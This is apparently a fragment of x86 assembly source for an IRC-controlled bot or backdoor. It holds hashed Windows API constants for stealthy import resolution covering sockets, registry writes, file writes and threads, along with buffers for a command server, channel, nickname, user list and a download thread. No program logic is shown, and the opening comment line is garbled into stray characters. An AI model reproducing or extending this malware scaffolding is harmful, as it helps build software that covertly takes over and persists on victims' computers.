; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;               Equates

;		Api hashes
                cExitProcess            equ 01a3e1fb1h
                cGetTickCount           equ 030e656feh
                cLoadLibrary            equ 06b7770cch
                cSleep                  equ 09e844015h
                cLocalAlloc             equ 046c1d071h
                cLocalFree              equ 094925a23h
                cWSACleanup             equ 035f0a67ah
                cWSAStartup             equ 05850b6b9h
                cclosesocket            equ 0f4af18bah
                cconnect                equ 06283b694h
                cgethostbyname          equ 0981305c0h
                crecv                   equ 0ea835800h
                csend                   equ 0ec889000h
                csocket                 equ 08ce453b4h
		cCreateThread		equ 03e94f848h
		cExitThread             equ 00eefa6bbh
		cCreateFile             equ 0c3941b3eh
		cWriteFile              equ 0d43240b9h
		cCloseHandle		equ 08a425b5dh
		cGetModuleFileName      equ 05f79a552h
		cRegOpenKeyEx           equ 08af52dbfh	; 0cfda29c2h
		cRegEnumKeyEx           equ 0cad428c2h
		cRegFlushKey            equ 0e90993cah
		cRegQueryValueEx        equ 0a42475aeh
		cRegSetValueEx          equ 072ead291h
		cRegCloseKey            equ 0e309339ah

;		Zero initiated space
                allocs                  = 0
                mr nbr,                 4
                mr ExitProcess,         4
                mr GetTickCount,        4
                mr LoadLibrary,         4
                mr Sleep,               4
                mr LocalAlloc,          4
                mr LocalFree,           4
                mr WSACleanup,          4
                mr WSAStartup,          4
                mr closesocket,         4
                mr connect,             4
                mr gethostbyname,       4
                mr recv,                4
                mr send,                4
                mr socket,              4
		mr CreateThread,	4
		mr ExitThread,		4
		mr CreateFile,		4
		mr WriteFile,		4
		mr CloseHandle,		4
		mr GetModuleFileName,	4
		mr RegOpenKeyEx,	4
		mr RegEnumKeyEx,	4
		mr RegFlushKey,		4
		mr RegQueryValueEx,	4
		mr RegSetValueEx,	4
		mr RegCloseKey,		4
                mr hsock,               4
		mr rseed,		4
		mr userhosthash,	4
		mr flags,		4
		mr downloadthreadid,	4
		mr inithandle,		4
		mr mainport,		9
		mr worddata,		12
                mr sockaddr,            16
		mr nickname,		16
		mr mainchan,		16
		mr regdatakey,		16
		mr mainserver,		32
		mr connectsettings,	512
                mr readline,            512
		mr modulefilename,	512
                mr writebuffer,         1024
                mr readqueue,           1024
		mr channelnames,	2048
		mr userlist,		4096

;		Flags
		flag_registered		equ 00000001h
		flag_nicktaken		equ 00000002h